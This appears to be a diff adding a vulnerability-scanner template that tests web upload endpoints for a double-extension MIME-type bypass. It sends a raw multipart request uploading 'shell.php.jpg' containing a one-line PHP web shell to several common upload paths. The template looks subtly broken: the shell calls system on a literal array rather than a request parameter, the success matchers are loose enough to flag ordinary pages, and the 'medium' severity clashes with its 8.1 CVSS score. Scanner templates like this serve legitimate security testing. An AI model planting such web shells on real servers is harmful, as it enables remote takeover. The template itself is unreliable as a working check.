@@ -1,0 +1,57 @@
+id: medium-upload-mime-type-bypass-double-extension
+
+info:
+  name: File Upload - MIME Type Bypass via Double Extension
+  author: elite-red-team
+  severity: medium
+  description: |
+    Detects file upload vulnerabilities where MIME type validation can be bypassed using double extensions.
+    This template tests various double extension combinations that can fool server-side validation.
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 8.1
+    cwe-id: CWE-434
+  tags: fileupload,bypass,mime,double-extension,rce
+
+http:
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+        
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW
+        Content-Disposition: form-data; name="file"; filename="shell.php.jpg"
+        Content-Type: image/jpeg
+        
+        <?php system(['cmd']); ?>
+        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+    payloads:
+      path:
+        - "{{BaseURL}}/upload"
+        - "{{BaseURL}}/upload.php"
+        - "{{BaseURL}}/fileupload"
+        - "{{BaseURL}}/file/upload"
+
+    attack: pitchfork
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 302
+
+      - type: word
+        words:
+          - "upload"
+          - "success"
+          - "file"
+          - "saved"
+          - "uploaded"
+        condition: or
+        case-insensitive: true
